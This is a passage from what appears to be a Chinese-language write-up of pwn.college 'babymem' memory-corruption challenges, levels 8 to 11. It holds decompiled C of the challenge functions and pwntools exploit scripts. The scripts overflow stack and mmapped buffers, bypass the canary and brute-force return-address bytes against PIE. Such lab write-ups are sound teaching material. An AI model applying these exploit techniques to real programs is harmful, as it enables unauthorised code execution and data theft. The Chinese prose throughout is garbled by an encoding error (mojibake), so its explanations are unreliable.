çš„å†…å®¹å¤åˆ¶åˆ°æ ˆä¸Šé¢</p><p>æ€è·¯ï¼šå…ˆç»•è¿‡ strlen çš„æ£€æŸ¥ï¼Œå†æ„é€  payload å†²æ‰è¿”å›åœ°å€æœ€åä¸¤ä¸ªå­—èŠ‚ï¼Œéœ€è¦çˆ†ç ´è¿”å›åœ°å€æœ€åä¸¤ä¸ªå­—èŠ‚æ¥å¯¹æŠ— pie</p><p>æ³¨æ„âš ï¸ï¼šå¦‚æœÂ <code>size</code>Â å¤§äºÂ <code>buf</code>Â çš„å®é™…å¤§å°ï¼Œ<code>memcpy</code>Â ä¼šå°è¯•ä»å †ä¸Š <code>buf</code>Â åé¢çš„å†…å­˜è¯»å–æ•°æ®ï¼Œå†²æ‰æ­£ç¡®çš„è¿”å›åœ°å€ï¼ˆæ³¨æ„åˆ°è¿™é‡Œåªè¦†ç›–ä¸¤ä¸ªå­—èŠ‚ï¼‰ï¼Œ å› æ­¤payload çš„å†…å®¹å’Œå‰é¢è¯»å–çš„è¿™ä¸ª size ä¸€å®šè¦å‡†ç¡®åŒ¹é…ä¸Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem_level8.0&#x27;</span>)<br><br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;100&#x27;</span>)<br><br>    <span class="hljs-comment">#payload = b&#x27;a&#x27; * 120 + b&#x27;\x56&#x27;+b&#x27;\x22&#x27; </span><br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">71</span> + p32(<span class="hljs-number">0x1B6A</span>)<br>    <span class="hljs-comment">#p.recvline(&#x27;Send your payload&#x27;)</span><br>    p.sendline(payload)<br><br>    <span class="hljs-comment">#p.interactive()</span><br>    <span class="hljs-built_in">str</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h1 id="8-1"><a href="#8-1" class="headerlink" title="8-1"></a>8-1</h1><p>ç•¥</p><h1 id="9-0"><a href="#9-0" class="headerlink" title="9-0"></a>9-0</h1><p>ä¸Šéš¾åº¦äº†ï¼Œæœ‰ Canaryï¼Œæœ‰ pieï¼Œæœ‰ä¸€æ®µç¥å¥‡çš„æ¯æ¬¡åª read 1 å­—èŠ‚çš„é€»è¾‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 9-1.c</span><br><span class="hljs-function">__int64 <span class="hljs-title">challenge</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">int</span> *v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> *v2; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+28h] [rbp-58h] BYREF</span><br>  __int64 *v5; <span class="hljs-comment">// [rsp+30h] [rbp-50h]</span><br>  <span class="hljs-keyword">int</span> *v6; <span class="hljs-comment">// [rsp+38h] [rbp-48h]</span><br>  __int64 v7[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-40h] BYREF</span><br>  __int64 v8[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+70h] [rbp-10h] BYREF è¿™é‡Œ</span><br><br>  v8[<span class="hljs-number">1</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(v7, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v7));<br>  v8[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>; <span class="hljs-comment">//è¿™é‡Œ</span><br>  v5 = v7;<span class="hljs-comment">// ç¼“å†²åŒºèµ·å§‹å¤„</span><br>  v6 = (<span class="hljs-keyword">int</span> *)v8 + <span class="hljs-number">1</span>; <span class="hljs-comment">// è¿™é‡Œ</span><br>  v4 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Payload size: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%lu&quot;</span>, &amp;v4);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Send your payload (up to %lu bytes)!\n&quot;</span>, v4);<br>  <span class="hljs-keyword">while</span> ( *v6 &lt; v4 )<br>  &#123;<br>    v0 = read(<span class="hljs-number">0</span>, (<span class="hljs-keyword">char</span> *)v5 + *v6, <span class="hljs-number">1uLL</span>);<span class="hljs-comment">//æ¯æ¬¡å¾€ç¼“å†²åŒºåç§»*v6å¤§å°å¤„å†™å…¥ 1 å­—èŠ‚</span><br>    *v6 += v0;<span class="hljs-comment">// *v6 è‡ªåŠ  1</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *v6 &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v1 = __errno_location();<br>    v2 = strerror(*v1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR: Failed to read input -- %s!\n&quot;</span>, v2);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ€è·¯å¦‚ä¸‹ </p><p>Canary ç»•è¿‡</p><ul><li>ç¼“å†²åŒºæº¢å‡ºåˆ° nï¼Œè¦†ç›– nï¼Œå°†å…¶æ”¹å†™ä¸ºç¼“å†²åŒºè·ç¦»è¿”å›åœ°å€çš„åç§»-1</li></ul><p>pie</p><ul><li>åŒ level 8 çˆ†ç ´</li></ul><p>åç§»</p><ul><li>ç¼“å†²åŒºèµ·å§‹å¤„ä¸ºrbp-0x40ï¼ŒCanary ä¸º rbp-0x8ï¼Œn å€¼ä½äºrbp-0x8-0x4<ul><li>ä»”ç»†åˆ†æä¸€ä¸‹ v8 å’Œ v6<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem_level9.0&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 128+8+2=138</span><br>    p.sendline(<span class="hljs-string">b&#x27;138&#x27;</span>) <br>    <span class="hljs-comment"># 136=\x88 æ³¨æ„ä¸èƒ½æ˜¯0x88ï¼ˆä¸ºä»€ä¹ˆï¼Ÿ)è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨ p8</span><br>    payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">116</span>+<span class="hljs-string">b&#x27;\x87&#x27;</span>+p16(<span class="hljs-number">0x1a17</span>)<br><br>    p.sendline(payload)<br><br>    <span class="hljs-built_in">str</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure></li></ul></li></ul><h1 id="9-1"><a href="#9-1" class="headerlink" title="9-1"></a>9-1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">while</span> True:<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem_level9.1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    # <span class="hljs-number">64</span>+<span class="hljs-number">8</span>+<span class="hljs-number">2</span><br>    p.sendline(b<span class="hljs-number">&#x27;74&#x27;</span>) <span class="hljs-meta"># easy <span class="hljs-meta-keyword">error</span> </span><br><br>    payload = b<span class="hljs-number">&#x27;</span>A<span class="hljs-number">&#x27;</span> * <span class="hljs-number">52</span>  # <span class="hljs-number">52</span> = <span class="hljs-number">0x40</span><span class="hljs-number">-0x8</span><span class="hljs-number">-0x4</span><br>    payload += p8(<span class="hljs-number">0x47</span>) # æ³¨æ„è¿™é‡Œæ˜¯ç¼“å†²åŒºåç§»+<span class="hljs-number">8</span><span class="hljs-number">-1</span><br>    payload += p16(<span class="hljs-number">0x1F6E</span>)<br>    <br>    p.sendline(payload)<br><br>    str = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> str.find(b<span class="hljs-number">&#x27;</span>pwn.college&#123;<span class="hljs-string">&#x27;) != -1:</span><br><span class="hljs-string">        print(str)</span><br><span class="hljs-string">        break</span><br></code></pre></td></tr></table></figure><h1 id="10-0"><a href="#10-0" class="headerlink" title="10-0"></a>10-0</h1><p>æ²¡æœ‰ win å‡½æ•°ï¼Œ flag è¢«æ³¨å…¥å†…å­˜ï¼Œå¯ç”¨äº† pie å’Œ Canary</p><p>æ‰“å°çš„ç¼“å†²åŒºå’Œ flag ä½ç½®è¾ƒè¿‘ï¼Œå¯ä»¥é€šè¿‡é¢˜ç›®æœ¬èº«é€»è¾‘ä¸­çš„ print å‡½æ•°æ‰“å°å‡º flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br> <br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br> <br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level10.0&#x27;</span>)<br><br><span class="hljs-comment"># å‡†å¤‡æœ‰æ•ˆè½½è·</span><br>buffer_size = <span class="hljs-number">31</span><br>p.sendline(<span class="hljs-string">b&#x27;31&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * buffer_size<br><br> <br>p.sendline(payload)<br><br><span class="hljs-comment"># ä¸è¿›ç¨‹è¿›è¡Œäº¤äº’ï¼Œä»¥æŸ¥çœ‹è¾“å‡ºæˆ–è°ƒè¯•</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="10-1"><a href="#10-1" class="headerlink" title="10-1"></a>10-1</h1><p>ç•¥</p><h1 id="11-0"><a href="#11-0" class="headerlink" title="11-0"></a>11-0</h1><p>æŒ‰ç†æ¥è¯´mmap åˆ†é…çš„åœ°å€åº”è¯¥ä¸æ˜¯ä¸è¿ç»­çš„</p><p>ä½†æ˜¯æ ¹æ®è¾“å‡ºå‘ç°åˆ†é…é¡µé¢çš„åœ°å€æ˜¯è¿ç»­çš„</p><blockquote><p>buf çš„åœ°å€åœ¨ flag åœ°å€åé¢73+0x4000 çš„åœ°æ–¹å—ï¼Ÿè¿™é‡Œ mmap çš„å†…å­˜åˆ†é…ï¼Œåˆ†é…çš„ç©ºé—´æ˜¯ç´§é‚»çš„å—ï¼Ÿ</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-function">__int64 <span class="hljs-title">challenge</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">int</span> *v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> *v2; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+20h] [rbp-30h]</span><br>  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [rsp+24h] [rbp-2Ch]</span><br>  <span class="hljs-keyword">size_t</span> nbytes; <span class="hljs-comment">// [rsp+28h] [rbp-28h] BYREF</span><br>  <span class="hljs-keyword">void</span> *v7; <span class="hljs-comment">// [rsp+30h] [rbp-20h]</span><br>  <span class="hljs-keyword">void</span> *v8; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-keyword">void</span> *v10; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br><br>  nbytes = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The challenge() function has just been launched!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This challenge stores your input buffer in an mmapped page of memory!&quot;</span>);<br>  v7 = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = %p\n&quot;</span>, v7);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;In this level, the flag will be loaded into memory.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;However, at no point will this program actually print the buffer storing the flag.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Memory mapping the flag...&quot;</span>);<br>  v0 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);<br>  v8 = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, v0, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Called mmap(0, 0x1000, 4, MAP_SHARED, open(\&quot;/flag\&quot;, 0), 0) = %p\n&quot;</span>, v8);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">2</span>; ++i )<br>  &#123;<br>    v10 = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = %p\n&quot;</span>, v10);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Memory mapping the input buffer...&quot;</span>);<br>  buf = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x49</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Called mmap(0, 73, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = %p\n&quot;</span>, buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Payload size: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%lu&quot;</span>, &amp;nbytes);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You have chosen to send %lu bytes of input!\n&quot;</span>, nbytes);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This will allow you to write from %p (the start of the input buffer)\n&quot;</span>, buf);<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n&quot;</span>,<br>    (<span class="hljs-keyword">char</span> *)buf + nbytes,<br>    nbytes - <span class="hljs-number">73</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Send your payload (up to %lu bytes)!\n&quot;</span>, nbytes);<br>  v5 = read(<span class="hljs-number">0</span>, buf, nbytes);<br>  <span class="hljs-keyword">if</span> ( v5 &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v1 = __errno_location();<br>    v2 = strerror(*v1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR: Failed to read input -- %s!\n&quot;</span>, v2);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You sent %d bytes!\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v5);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The program&#x27;s memory status:&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the input buffer starts at %p\n&quot;</span>, buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the address of the flag is %p.\n&quot;</span>, v8);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You said: %s\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)buf);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br><br><br><br><br><span class="hljs-function">The <span class="hljs-title">challenge</span><span class="hljs-params">()</span> function has just been launched!</span><br><span class="hljs-function">This challenge stores your input buffer in an mmapped page of memory!</span><br><span class="hljs-function">Called <span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)</span> </span>= <span class="hljs-number">0x7f4208d4a000</span><br>In <span class="hljs-keyword">this</span> level, the flag will be loaded into memory.<br>However, at no point will <span class="hljs-keyword">this</span> program actually print the buffer storing the flag.<br>Memory mapping the flag...<br><span class="hljs-function">Called <span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">4</span>, MAP_SHARED, open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>), <span class="hljs-number">0</span>)</span> </span>= <span class="hljs-number">0x7f4208d1d000</span><br><span class="hljs-function">Called <span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)</span> </span>= <span class="hljs-number">0x7f4208d1c000</span><br><span class="hljs-function">Called <span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)</span> </span>= <span class="hljs-number">0x7f4208d1b000</span><br><span class="hljs-function">Called <span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)</span> </span>= <span class="hljs-number">0x7f4208d1a000</span><br>Memory mapping the input buffer...<br><span class="hljs-function">Called <span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">73</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)</span> </span>= <span class="hljs-number">0x7f4208d19000</span><br>Payload size: You have chosen to send <span class="hljs-number">16384</span> bytes of input!<br>This will allow you to write from <span class="hljs-number">0x7f4208d19000</span> (the start of the input buffer)<br><span class="hljs-function">right up <span class="hljs-title">to</span> <span class="hljs-params">(but <span class="hljs-keyword">not</span> including)</span> 0<span class="hljs-title">x7f4208d1d000</span> <span class="hljs-params">(which is <span class="hljs-number">16311</span> bytes beyond the end of the buffer)</span>.</span><br><span class="hljs-function">Send your <span class="hljs-title">payload</span> <span class="hljs-params">(up to <span class="hljs-number">16384</span> bytes)</span>!</span><br><span class="hljs-function">You sent 16384 bytes!</span><br><span class="hljs-function">The program&#x27;s memory status:</span><br><span class="hljs-function">- the input buffer starts at 0x7f4208d19000</span><br><span class="hljs-function">- the address of the flag is 0x7f4208d1d000.</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br> <br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br> <br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level11.0&#x27;</span>)<br><br><span class="hljs-comment"># å‡†å¤‡æœ‰æ•ˆè½½è·</span><br>buffer_size = <span class="hljs-number">16384</span><br>p.sendline(<span class="hljs-string">b&#x27;16384&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * buffer_size<br><br> <br>p.sendline(payload)<br><br><span class="hljs-comment"># ä¸è¿›ç¨‹è¿›è¡Œäº¤äº’ï¼Œä»¥æŸ¥çœ‹è¾“å‡ºæˆ–è°ƒè¯•</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="11-1"><a href="#11-1" class="headerlink" title="11-1"></a>11-1</h1><p>0x4000</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">__int64 <span class="hljs-title">challenge</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">int</span> *v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> *v2; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+20h] [rbp-30h]</span><br>  <span class="hljs-keyword">size_t</span> nbytes[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+28h] [rbp-28h] BYREF</span><br>  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-keyword">void</span> *v7; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br><br>  nbytes[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  nbytes[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">size_t</span>)mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>  v0 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);<br>  nbytes[<span class="hljs-number">2</span>] = (<span class="hljs-keyword">size_t</span>)mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, v0, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">1</span>; ++i )<br>    v7 = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span 